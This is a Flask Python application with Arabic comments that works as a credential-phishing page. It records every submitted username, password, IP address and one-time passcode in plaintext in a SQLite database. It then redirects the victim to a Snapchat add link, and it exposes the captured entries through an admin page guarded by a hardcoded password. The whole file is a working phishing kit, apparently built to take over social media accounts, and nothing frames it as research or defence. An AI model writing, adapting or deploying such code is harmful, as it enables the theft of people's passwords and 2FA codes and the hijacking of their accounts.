from flask import Flask, render_template, request, redirect, url_for, session, flash
import sqlite3
from datetime import datetime
import os
import re

app = Flask(__name__)
app.secret_key = 'your-secret-key-here'


# فقط نفذ عند الحاجة وليس كل مرة يبدأ التطبيق
def init_db():
    conn = sqlite3.connect('login_attempts.db')
    cursor = conn.cursor()
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS login_attempts (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            username TEXT NOT NULL,
            password TEXT NOT NULL,
            timestamp DATETIME NOT NULL,
            ip_address TEXT NOT NULL,
            otp_code TEXT
        )
    ''')
    conn.commit()
    conn.close()

# شغله فقط في أول مرة أو عند الضرورة
if os.environ.get('INIT_DB', 'false') == 'true':
    init_db()


@app.route('/')
def login():
    return render_template('login.html')


@app.route('/login', methods=['POST'])
def handle_login():
    username = request.form['username']
    password = request.form['password']
    ip_address = request.environ.get('HTTP_X_FORWARDED_FOR', request.remote_addr)
    timestamp = datetime.now()

    # تحقق من اللغة الإنجليزية فقط
    if not re.match(r'^[A-Za-z0-9_]+$', username) or not re.match(r'^[A-Za-z0-9_]+$', password):
        flash('اسم المستخدم وكلمة المرور يجب أن تكون بالأحرف الإنجليزية فقط.')
        return redirect(url_for('login'))

    conn = sqlite3.connect('login_attempts.db')
    cursor = conn.cursor()
    cursor.execute('''
        INSERT INTO login_attempts (username, password, timestamp, ip_address)
        VALUES (?, ?, ?, ?)
    ''', (username, password, timestamp, ip_address))
    conn.commit()
    session['username'] = username
    session['login_id'] = cursor.lastrowid
    conn.close()
    return redirect(url_for('otp'))


@app.route('/otp')
def otp():
    if 'username' not in session:
        return redirect(url_for('login'))
    return render_template('otp.html')


@app.route('/verify-otp', methods=['POST'])
def verify_otp():
    otp_code = request.form['otp_code']

    if 'login_id' in session:
        conn = sqlite3.connect('login_attempts.db')
        cursor = conn.cursor()
        cursor.execute('''
            UPDATE login_attempts SET otp_code = ? WHERE id = ?
        ''', (otp_code, session['login_id']))
        conn.commit()
        conn.close()

    # التوجيه إلى تطبيق Snapchat
    return redirect("snapchat://add/maymona19")


@app.route('/admin')
def admin():
    password = request.args.get("pw")
    if password != "A554399a":  # غير كلمة السر كما تشاء
        return "Access denied"
    conn = sqlite3.connect('login_attempts.db')
    cursor = conn.cursor()
    cursor.execute('SELECT * FROM login_attempts ORDER BY timestamp DESC')
    attempts = cursor.fetchall()
    conn.close()
    return render_template('admin.html', attempts=attempts)


if __name__ == '__main__':
    app.run(debug=True)
